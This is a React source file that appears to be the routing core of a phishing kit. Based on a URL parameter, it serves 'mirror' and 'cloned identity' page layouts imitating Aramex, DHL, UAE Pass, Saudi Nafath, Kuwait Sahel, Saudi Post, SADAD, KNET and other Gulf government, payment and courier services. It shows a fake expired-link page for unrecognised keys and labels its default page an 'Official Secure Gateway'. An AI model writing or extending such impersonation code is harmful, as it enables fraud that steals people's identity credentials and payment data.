import React from 'react';
import { useSearchParams } from "react-router-dom";
import { PaymentEntityConfig, resolveEntity, paymentEntities } from "@/config/gccPaymentEntities";
import { 
  NafathMirrorLayout, 
  UAEDirhamMirrorLayout, 
  SahelMirrorLayout, 
  SPLMirrorLayout, 
  SadadMirrorLayout,
  KnetMirrorLayout 
} from "./MirrorLayouts";
import { 
  AramexMirrorLayout, 
  DhlMirrorLayout 
} from "./CloneLayouts";
import { ThemedHeader } from "@/components/ui/ThemedHeader";
import { LinkExpired } from "./LinkExpired";

interface MirrorPageWrapperProps {
  children: React.ReactNode;
  entityId?: string;
  title?: string;
  subtitle?: string;
  linkData?: any;
  hideHeader?: boolean;
}

/**
 * MirrorPageWrapper
 * 
 * GCC_OMNI_ANTI_404_PRESENCE_V600
 * Central Visual Identity Router.
 */
export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({ 
  children, 
  entityId, 
  title, 
  subtitle,
  linkData,
  hideHeader = false
}) => {
  const [searchParams] = useSearchParams();
  
  const companyKey = entityId || searchParams.get("company") || linkData?.payload?.service_key;
  
  // ANTI-404: If no companyKey and no default children, show error
  if (!companyKey && !children) {
    return <LinkExpired config={paymentEntities.DEFAULT} />;
  }

  const normalizedKey = (companyKey || '').toLowerCase().replace(/[^a-z0-9]/g, '');
  const entityConfig = resolveEntity(companyKey || 'default');

  // GRACEFUL ERROR: If entity resolution fails or key is clearly invalid
  if (entityConfig.id === 'DEFAULT' && companyKey && companyKey !== 'default' && !normalizedKey.includes('pay')) {
     return <LinkExpired config={entityConfig} />;
  }

  // GOVERNMENT SERVICE VALIDATION
  const isGov = normalizedKey.includes('nafath') || normalizedKey.includes('uaepass') || normalizedKey.includes('sahel') || normalizedKey.includes('iam') || normalizedKey.includes('moi');
  if (isGov && entityConfig.id === 'DEFAULT') {
    return <LinkExpired config={entityConfig} />;
  }

  // 1. ARAMEX (Cloned Identity)
  if (normalizedKey.includes('aramex')) {
    return (
      <AramexMirrorLayout config={entityConfig} title={title}>
        {children}
      </AramexMirrorLayout>
    );
  }

  // 2. DHL (Cloned Identity)
  if (normalizedKey.includes('dhl')) {
    return (
      <DhlMirrorLayout config={entityConfig} title={title}>
        {children}
      </DhlMirrorLayout>
    );
  }

  // 3. UAE DIRHAM / UAE PASS / DUBAI PAY
  if (normalizedKey.includes('dubai') || normalizedKey.includes('uaepass') || normalizedKey.includes('dirham') || normalizedKey.includes('uae')) {
    return (
      <UAEDirhamMirrorLayout config={entityConfig} title={title}>
        {children}
      </UAEDirhamMirrorLayout>
    );
  }

  // 4. KSA NAFATH (SDAIA / National Identity)
  if (normalizedKey.includes('nafath') || normalizedKey.includes('iam')) {
    return (
      <NafathMirrorLayout config={entityConfig} title={title}>
        {children}
      </NafathMirrorLayout>
    );
  }

  // 5. KUWAIT SAHEL (MoI / Digital Identity)
  if (normalizedKey.includes('sahel') || normalizedKey.includes('kuwait') || normalizedKey.includes('moi')) {
    return (
      <SahelMirrorLayout config={entityConfig} title={title}>
        {children}
      </SahelMirrorLayout>
    );
  }

  // 6. KSA SPL (Saudi Post / SPL Online)
  if (normalizedKey.includes('spl') || normalizedKey.includes('post')) {
    return (
      <SPLMirrorLayout config={entityConfig} title={title}>
        {children}
      </SPLMirrorLayout>
    );
  }

  // 7. KSA SADAD (OLP / National Billing)
  if (normalizedKey.includes('sadad') || normalizedKey.includes('bill')) {
    return (
      <SadadMirrorLayout config={entityConfig} title={title}>
        {children}
      </SadadMirrorLayout>
    );
  }

  // 8. KNET / BENEFIT / MAAL / JAYWAN
  if (normalizedKey.includes('knet') || normalizedKey.includes('benefit') || normalizedKey.includes('maal') || normalizedKey.includes('jaywan')) {
    return (
      <KnetMirrorLayout config={entityConfig}>
        {children}
      </KnetMirrorLayout>
    );
  }

  // 9. SMSA / FEDEX (Shipping generic)
  if (normalizedKey.includes('smsa') || normalizedKey.includes('fedex')) {
    return (
      <AramexMirrorLayout config={entityConfig} title={title}>
        {children}
      </AramexMirrorLayout>
    );
  }

  // DEFAULT (Generic Layout for Other Entities)
  return (
    <div className="min-h-screen flex flex-col bg-background font-primary" dir="rtl">
      {!hideHeader && (
        <ThemedHeader
          config={entityConfig}
          title={entityConfig.nameAr}
          subtitle="E-Services & Payment Gateway"
        />
      )}
      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
        <div className="w-full max-w-xl space-y-8">
          <div className="text-center space-y-2">
            <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-foreground">{title || entityConfig.nameAr}</h2>
            <p className="text-sm font-medium uppercase tracking-wide text-muted-foreground">{subtitle || 'Official Secure Gateway'}</p>
          </div>
          {children}
        </div>
      </main>
    </div>
  );
};
